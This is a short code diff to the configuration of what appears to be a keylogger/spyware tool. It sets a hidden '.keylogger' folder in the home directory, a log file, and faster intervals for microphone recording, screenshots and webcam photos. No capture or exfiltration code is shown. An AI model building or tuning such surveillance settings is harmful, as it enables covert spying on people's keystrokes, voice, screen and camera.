@@ -2,16 +2,16 @@ import os
 
 # path
 name_dir = '.keylogger'
-logs_file = 'Logs.txt'
+logs_file = 'logs.txt'
 user = os.path.expanduser('~')
 path = user + '/' + name_dir + '/'
 
 # microphone
 microphone_time = 10
-microphone_repeat = 60
+microphone_repeat = 5
 
 # screen
-screenshots_repeat = 60
+screenshots_repeat = 5
 
 # web camera
 photo_repeat = 5
